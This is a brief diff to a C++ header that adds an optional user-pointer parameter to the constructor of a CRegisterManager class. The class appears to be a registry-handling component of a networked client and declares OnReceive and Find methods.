@@ -15,7 +15,7 @@
 class CRegisterManager : public CManager  
 {
 public:
-	CRegisterManager(IOCPClient* ClientObject, int n);
+	CRegisterManager(IOCPClient* ClientObject, int n, void* user = nullptr);
 	virtual ~CRegisterManager();
 	VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);
 	VOID Find(char bToken, char *szPath);
